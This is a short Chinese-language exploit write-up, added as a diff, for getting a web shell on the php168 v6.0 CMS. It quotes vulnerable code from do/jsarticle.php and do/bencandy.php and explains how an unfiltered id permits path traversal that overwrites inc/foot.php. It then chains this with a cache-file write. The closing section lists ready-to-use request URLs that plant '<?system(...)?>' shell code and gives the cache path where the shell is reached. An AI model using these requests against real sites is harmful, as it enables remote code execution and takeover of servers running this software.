@@ -1,0 +1,63 @@
+php168-v6.0拿shell
+
+分两步 第一 do/下jsarticle.php文件
+if(!eregi("^(hot|com|new|lastview|like|pic)$",$type)){
+die("类型有误");
+}
+$FileName=dirname(__FILE__)."/../cache/jsarticle_cache/";
+if($type==''like''){
+$FileName.=floor($id/3000)."/";
+}else{
+unset($id);
+} 
+$FileName.="{$type}_{$fid}_{$id}.php";
+..................
+if(!is_dir(dirname($FileName))){
+makepath(dirname($FileName));
+}
+if( (time()-filemtime($FileName))>($webdb["cache_time_$type"]*60) ){
+write_file($FileName,"<?php \r\n\$show=stripslashes(''".addslashes($show)."''); ?>");
+
+                                             //write_file上面覆盖任意php文件！因为id没过滤
+
+}
+
+第二 do/bencandy.php文件
+require_once(dirname(__FILE__)."/"."global.php");
+!$aid && $aid = intval($id);
+$id = $aid;
+$page<1 && $page=1;
+
+$min=intval($page)-1;
+$erp=$Fid_db[iftable][$fid]?$Fid_db[iftable][$fid]:'''';
+$rsdb=$db->get_one("SELECT R.*,A.* FROM {$pre}article$erp A LEFT JOIN {$pre}reply$erp R ON A.aid=R.aid WHERE A.aid=$aid ORDER BY R.topic DESC,R.orderid ASC LIMIT $min,1");
+
+if(!$rsdb){
+showerr("数据不存在!");
+}elseif($fid!=$rsdb[fid]){
+showerr("FID有误");
+}
+........................
+$Cache_FileName=PHP168_PATH."cache/bencandy_cache/".floor($id/3000)."/{$id}_{$page}.php";
+if(!$jobs&&$webdb[bencandy_cache_time]&&(time()-filemtime($Cache_FileName))<($webdb[bencandy_cache_time]*60)){
+echo read_file($Cache_FileName);
+exit;
+}
+..................................
+
+if(!$jobs&&$webdb[bencandy_cache_time]&&(time()-filemtime($Cache_FileName))>($webdb[bencandy_cache_time]*60)){
+
+if(!is_dir(dirname($Cache_FileName))){
+   makepath(dirname($Cache_FileName));
+}
+$content.="<SCRIPT LANGUAGE=''JavaScript'' src=''$webdb[www_url]/do/job.php?job=updatehits&aid=$id''></SCRIPT>";
+write_file($Cache_FileName,$content);      //注意这里写文件了
+}elseif($jobs==''show''){
+@unlink($Cache_FileName);
+}
+到这里大概问题也差不多搞清楚了，我们看下$content，其实它是作过初始化的，往上可以看到require(PHP168_PATH."inc/foot.php");这样一句，初始化就在这里，我们利用第一个问题，覆盖这文件里的内容，接下来我们就可以直接提交$content变量注入shell代码了！
+
+       利用：
+      do/jsarticle.php?type=like&id=xhming/../../../../inc/foot
+      do/bencandy.php?fid=4&id=582&content=<?system($xhming);phpinfo()?>
+      cache/bencandy_cache/0/582_1.php   //记住id值，由于有缓存和时间的判断每一步要等会
